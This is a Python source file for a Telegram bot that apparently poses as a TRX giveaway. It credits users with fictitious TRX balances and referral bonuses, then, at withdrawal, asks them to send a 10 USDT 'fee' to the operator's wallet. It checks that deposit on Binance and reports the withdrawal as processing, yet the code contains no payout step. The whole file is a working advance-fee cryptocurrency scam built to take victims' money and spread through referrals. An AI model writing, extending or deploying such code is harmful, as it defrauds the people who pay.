import re
import requests
import hashlib
import hmac
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Store user balances and referral data (use a database for production)
user_data = {}

# Telegram bot token
TOKEN = ""

# Binance API credentials (Replace with your actual keys)
BINANCE_API_KEY = ""
BINANCE_SECRET_KEY = ""

WITHDRAW_FEE_ADDRESS = ""   # Replace with your USDT wallet address
MIN_WITHDRAW_BALANCE = 300  # Minimum TRX required for withdrawal
REFERRAL_BONUS = 50  # TRX bonus for referring a new user
TXID_REGEX = r"^0x[a-fA-F0-9]{64}$"

def get_binance_recent_deposits():
    url = "https://api.binance.com/sapi/v1/capital/deposit/hisrec"
    timestamp = int(time.time() * 1000)
    query_string = f"timestamp={timestamp}"
    signature = hmac.new(BINANCE_SECRET_KEY.encode(), query_string.encode(), hashlib.sha256).hexdigest()
    headers = {"X-MBX-APIKEY": BINANCE_API_KEY}
    params = {"timestamp": timestamp, "signature": signature}
    response = requests.get(url, headers=headers, params=params)
    return response.json() if response.status_code == 200 else None

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    referrer_id = int(context.args[0]) if context.args and context.args[0].isdigit() else None
    
    if user_id not in user_data:
        user_data[user_id] = {"balance": 25, "referrals": 0, "subscribed": True, "withdraw_address": None}
        if referrer_id and referrer_id in user_data:
            user_data[referrer_id]["balance"] += REFERRAL_BONUS
            user_data[referrer_id]["referrals"] += 1
            await context.bot.send_message(referrer_id, f"🎉 {username} joined from your link! You earned {REFERRAL_BONUS} TRX!")
    else:
        user_data[user_id]["subscribed"] = True

    await update.message.reply_text(f"Hello {username}! 🎉\nYou've been credited with 25 TRX coins.\nYour balance: {user_data[user_id]['balance']} TRX.\n🚀 Invite new users and earn more TRX rewards!")

async def withdraw(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in user_data or not user_data[user_id]["subscribed"]:
        await update.message.reply_text("❌ You need to subscribe first by using /start.")
        return
    if user_data[user_id]["balance"] < MIN_WITHDRAW_BALANCE:
        await update.message.reply_text(f"⚠️ Minimum balance required for withdrawal is {MIN_WITHDRAW_BALANCE} TRX. Invite friends to earn rewards!")
        return
    await update.message.reply_text("Please enter your TRX wallet address for withdrawal.")
    context.user_data["awaiting_address"] = True

async def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if context.user_data.get("awaiting_address"):
        user_data[user_id]["withdraw_address"] = text
        context.user_data["awaiting_address"] = False
        await update.message.reply_text("✅ Address saved! Type 'confirm' to proceed with withdrawal.")
        context.user_data["awaiting_confirmation"] = True
        return

    if context.user_data.get("awaiting_confirmation") and text.lower() == "confirm":
        context.user_data["awaiting_confirmation"] = False
        await update.message.reply_text(f"💰 To withdraw, send 10 USDT(trc20) as a fee to this address:\n🔹 {WITHDRAW_FEE_ADDRESS}\n\nAfter payment, send the transaction ID (TXID) to proceed.")
        context.user_data["awaiting_txid"] = True
        return

    if context.user_data.get("awaiting_txid"):
        if re.match(TXID_REGEX, text):
            deposits = get_binance_recent_deposits()
            if deposits:
                for deposit in deposits:
                    if deposit.get("txId") == text:
                        await update.message.reply_text("✅ Transaction verified! Withdrawal is being processed.")
                        context.user_data["awaiting_txid"] = False
                        return
                await update.message.reply_text("❌ Transaction not found in Binance deposits!")
            else:
                await update.message.reply_text("❌ Unable to fetch Binance transactions! Try again later.")
        else:
            await update.message.reply_text("❌ Invalid transaction ID format! Please enter a valid TXID.")

async def referral(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in user_data or not user_data[user_id]["subscribed"]:
        await update.message.reply_text("❌ First, subscribe by using /start.")
        return
    referral_link = f"https://t.me/Tr0nGiverBot?start={user_id}"
    await update.message.reply_text(f"Invite users & earn 50 TRX per referral!\n🔗 {referral_link}")

async def balance(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in user_data or not user_data[user_id]["subscribed"]:
        await update.message.reply_text("❌ Subscribe by using /start.")
        return
    await update.message.reply_text(f"Your Balance: {user_data[user_id]['balance']} TRX")

async def help_command(update: Update, context: CallbackContext):
    await update.message.reply_text("📌 Available Commands:\n/start - Register & get 25 TRX.\n/referral - Get your referral link.\n/balance - Show TRX balance.\n/withdraw - Withdraw TRX.\n/help - Show this help message.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("referral", referral))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__":
    main()
